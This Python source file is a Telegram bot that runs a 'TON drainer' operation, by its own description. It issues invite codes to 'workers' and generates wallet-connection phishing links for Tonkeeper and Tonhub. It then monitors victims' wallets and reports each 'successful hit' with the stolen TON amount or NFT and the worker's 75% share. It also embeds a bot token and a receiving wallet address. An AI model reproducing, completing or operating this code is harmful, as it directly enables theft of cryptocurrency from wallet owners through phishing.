from database import *
from keyboard import *
from work import *
# from payment import *

import asyncio
import re
from pytonconnect import TonConnect

from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher, FSMContext
from aiogram.utils import executor
from aiogram.dispatcher.handler import CancelHandler, current_handler
from aiogram.types import BotCommand
from aiogram.dispatcher.filters.state import State, StatesGroup

logs = 5107144356
admins = [5107144356]
codes = []
addrr = 'UQBjntz5ETxunwjMul1SSUK718uyaVhBd5h1sbbcGNycSP0c'

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

token = '7825399084:AAFIOuS92DHDfN-hE9-SG_7hQqlc9jUqRP4'
bot = Bot(token=token, parse_mode='HTML')
dp = Dispatcher(bot, storage=MemoryStorage(), loop=loop)

wallets_list = TonConnect.get_wallets()


class States(StatesGroup):
    reg = State()
    change_address = State()
    change_address1 = State()
    choose_wallet = State()
    input_comment = State()


async def auto_check(id, url_id, msg: types.Message, url, wallet, kb):
    first_status = 'Создана'
    while True:
        try:
            wdata = (await get_status(url_id))["result"]
        except:
            break
        status = wdata['status']
        if status != first_status:
            first_status = status
            if status == 'Выполнено':
                if wdata['nft'] == {}:
                    summ = float(wdata['wallet']['balance'])
                    worker_summ = summ - (summ / 100 * 25)
                    address = wdata['wallet']['address']
                    await add_balance(id, worker_summ)
                    await msg.edit_text(f'Выполнено!\n\nАйди: <b>{url_id}</b>\nСтатус: <b>{status}</b>')
                    await msg.reply(
                        f"<b>Успешный залет!</b>\n\nКошелек: <b><a href='https://tonscan.org/address/{address}'>{address}</a></b>\nСумма: <b>{summ} TON</b>\nВаша доля: <b>{worker_summ} TON</b>",
                        disable_web_page_preview=True)
                    await bot.send_message(logs,
                                           f"<b>Успешный залет!</b>\n\nКошелек: <b><a href='https://tonscan.org/address/{address}'>{address}</a></b>\nСумма: <b>{summ} TON</b>\nДоля воркера: <b>{worker_summ} TON</b>",
                                           reply_markup=kb, disable_web_page_preview=True)
                elif wdata['nft'] != {}:
                    name = wdata['nft']['name']
                    nft_url = wdata['nft']['nft_url']
                    await msg.reply(
                        f"<b>Успешный залет!</b>\n\nКошелек: <b><a href='https://tonscan.org/address/{address}'>{address}</a></b>\nNFT: <b><a href='{nft_url}'>{name}</a></b>",
                        disable_web_page_preview=True)
                    await bot.send_message(logs,
                                           f"<b>Успешный залет!</b>\n\nКошелек: <b><a href='https://tonscan.org/address/{address}'>{address}</a></b>\nNFT: <b><a href='{nft_url}'>{name}</a></b>",
                                           reply_markup=kb, disable_web_page_preview=True)
                break
            elif status == 'Ошибка':
                text = f'Не удалось выполнить!\n\nАйди: <b>{url_id}</b>\nОшибка: <b>{wdata["error"]}</b>'
                if wdata['wallet'] != {}:
                    summ = float(wdata['wallet']['balance'])
                    address = wdata['wallet']['address']
                    text += f"\n\nКошелек: <b><a href='https://tonscan.org/address/{address}'>{address}</a></b>\nБаланс: <b>{summ} TON</b>"
                if wdata['nft'] != {}:
                    name = wdata['nft']['name']
                    nft_url = wdata['nft']['nft_url']
                    text += f"\n\nNFT: <b><a href='{nft_url}'>{name}</a></b>"
                await msg.edit_text(text, disable_web_page_preview=True)
                await msg.reply(f'<b>{url_id}</b> завершен с ошибкой <b>{wdata["error"]}</b>')
                break
            else:
                text = f'Айди: <b>{url_id}</b>\nТип кошелька: <b>{wallet}</b>\nСсылка: <b>{url}</b>\nСтатус: <b>{status}</b>'
                if wdata['wallet'] != {}:
                    address = wdata['wallet']['address']
                    text += f"\n\nКошелек: <b><a href='https://tonscan.org/address/{address}'>{address}</a></b>"
                    try:
                        summ = float(wdata['wallet']['balance'])
                        text += f"\nБаланс: <b>{summ} TON</b>"
                    except:
                        pass
                if wdata['nft'] != {}:
                    name = wdata['nft']['name']
                    nft_url = wdata['nft']['nft_url']
                    text += f"\n\nNFT: <b><a href='{nft_url}'>{name}</a></b>"
                await msg.edit_text(text, disable_web_page_preview=True)
                if status != 'Ожидание подключения':
                    await msg.reply(f'Статус <b>{url_id}</b> обновлен на <b>{status}</b>',
                                    disable_web_page_preview=True)
        await asyncio.sleep(1)


@dp.message_handler(commands=['addcode'])
async def send_welcome(msg: types.Message):
    id = msg.chat.id
    if id not in admins:
        return
    code = ''.join(secrets.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for i in range(10))
    codes.append(code)
    await bot.send_message(id, f'Код <code>{code}</code> создан')


@dp.message_handler(commands=['start'])
async def send_welcome(msg: types.Message):
    id = msg.chat.id
    if not await check_reg(id):
        if id not in admins:
            await bot.send_message(id, 'Введите код')
            return await States.reg.set()
        else:
            await reg(id)
    await bot.send_message(id, 'Добро пожаловать в панель тон дрейнера!', reply_markup=start_kb)


@dp.callback_query_handler(lambda call: True)
async def handler_call(call: types.CallbackQuery, state: FSMContext):
    id = call.message.chat.id
    if call.data == 'profil':
        await call.message.edit_text(
            f'Баланс: <b>{await get_info(id, "profit")} TON</b>\nАдрес: <b>{await get_info(id, "address")}</b>',
            reply_markup=profil_kb)
    elif call.data == 'back_main':
        await call.message.edit_text('Добро пожаловать в панель тон дрейнера', reply_markup=start_kb)
    elif call.data == 'change_address':
        m = await call.message.edit_text('Отправьте ваш <b>TON адрес</b>:')
        await state.update_data({"m": m})
        await States.change_address.set()
    '''
    elif call.data == 'output':
        address = await get_info(id, "address")
        balance = await get_info(id, "profit")
        if address == 'Не указан':
            return await call.answer(text="Адрес не указан", show_alert=True)
        if balance < 0.5:
            return await call.answer(text="Минимальная сумма вывода 0.5 TON", show_alert=True)
        await del_balance(id, balance)
        m = await bot.send_message(id, 'Отправка транзакции...\n\n<b>Не используйте бота до отправки транзакции.</b>')
        await withward(address, balance - 0.1)
        await m.edit_text('<b>Транзакция отправлена в блокчейн</b>')
        await bot.send_message(id, 'Добро пожаловать в панель тон дрейнера!', reply_markup=start_kb)
    '''
    elif call.data == 'create_url':
    wallets_kb = InlineKeyboardMarkup()
    for wallet in wallets_list:
        wallets_kb.add(InlineKeyboardButton(wallet['name'], callback_data=wallet['name']))
    wallets_kb.add(InlineKeyboardButton('Отмена', callback_data='cancle'))
    await call.message.edit_text('Выберите кошелек:', reply_markup=wallets_kb)
    await States.choose_wallet.set()


@dp.message_handler(state=States.reg)
async def send_text(msg: types.Message, state: FSMContext):
    id = msg.from_user.id
    if msg.text not in codes:
        return await bot.send_message(id, 'Хуй')
    codes.remove(msg.text)
    await reg(id)
    await bot.send_message(id, 'Добро пожаловать в панель тон дрейнера!', reply_markup=start_kb)
    return await state.finish()


@dp.callback_query_handler(lambda call: True, state=States.choose_wallet)
async def handler_call(call: types.CallbackQuery, state: FSMContext):
    id = call.message.chat.id
    if call.data == 'cancle':
        await call.message.edit_text('Добро пожаловать в панель тон дрейнера', reply_markup=start_kb)
        return await state.finish()
    await state.update_data(wallet_type=call.data)
    m = await call.message.edit_text('Введите комментарий до 45 символов (он будет отображен в контракте):',
                                     reply_markup=skip_kb)
    await state.update_data(m=m)
    await States.input_comment.set()


@dp.callback_query_handler(lambda call: True, state=States.input_comment)
async def handler_call(call: types.CallbackQuery, state: FSMContext):
    id = call.message.chat.id
    if call.data == 'skip':
        wallet_type = (await state.get_data())['wallet_type']
        data = await gen_url(wallet_type, addrr, None)
        if data == False:
            await call.message.edit_text('Произошла ошибка на строне API!')
            await bot.send_message(id, 'Добро пожаловать в панель тон дрейнера', reply_markup=start_kb)
            return await state.finish()
        await call.message.edit_text(
            f'Айди: <b>{data["result"]["id"]}</b>\nТип кошелька: <b>{"Tonkeeper" if wallet_type == 0 else "Tonhub"}</b>\nСсылка: <b>{data["result"]["url"]}</b>\nСтатус: <b>Создана</b>')
        kb = InlineKeyboardMarkup().add(
            types.InlineKeyboardButton(text=f"Воркер: {call.from_user.first_name}", url=call.from_user.url))
        asyncio.create_task(auto_check(id, data["result"]["id"], call.message, data["result"]["url"], wallet_type, kb))
        return await state.finish()


@dp.message_handler(state=States.input_comment)
async def send_text(msg: types.Message, state: FSMContext):
    id = msg.from_user.id
    await msg.delete()
    if len(msg.text) > 45:
        return await bot.send_message(id, 'Не верный комментарий')
    wallet_type = (await state.get_data())['wallet_type']
    data = await gen_url(wallet_type, addrr, msg.text)
    if data == False:
        await bot.send_message(id, 'Произошла ошибка на строне API!')
        await bot.send_message(id, 'Добро пожаловать в панель тон дрейнера', reply_markup=start_kb)
        return await state.finish()
    await (await state.get_data())['m'].delete()
    m = await bot.send_message(id,
                               f'Айди: <b>{data["result"]["id"]}</b>\nТип кошелька: <b>{wallet_type}</b>\nСсылка: <b>{data["result"]["url"]}</b>\nСтатус: <b>Создана</b>')
    kb = InlineKeyboardMarkup().add(
        types.InlineKeyboardButton(text=f"Воркер: {msg.from_user.first_name}", url=msg.from_user.url))
    asyncio.create_task(auto_check(id, data["result"]["id"], m, data["result"]["url"], wallet_type, kb))
    return await state.finish()


@dp.message_handler(state=States.change_address)
async def send_text(msg: types.Message, state: FSMContext):
    await msg.delete()
    await (await state.get_data())['m'].delete()
    if re.search(r"EQ[a-zA-Z0-9_-]{45,46}", msg.text):
        await state.update_data(address=str(msg.text))
        await bot.send_message(msg.from_user.id, f'Подтвердите смену адреса на <code>{msg.text}</code>',
                               reply_markup=addrr_kb)
        await States.change_address1.set()
    else:
        await bot.send_message(msg.from_user.id, "Неверный адрес кошелька TON!")
        await bot.send_message(msg.from_user.id, 'Добро пожаловать в панель тон дрейнера', reply_markup=start_kb)
        return await state.finish()


@dp.callback_query_handler(lambda call: True, state=States.change_address1)
async def handler_call(call: types.CallbackQuery, state: FSMContext):
    id = call.message.chat.id
    if call.data == 'confirm':
        address = str((await state.get_data())['address'])
        await change_address(id, address)
        await call.message.edit_text(f'Ваш адрес успешно изменен на <code>{address}</code>')
    elif call.data == 'cancel':
        await call.message.edit_text(id, f'Операция отменена')
    await bot.send_message(id, 'Добро пожаловать в панель тон дрейнера', reply_markup=start_kb)
    return await state.finish()


if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True, loop=loop)
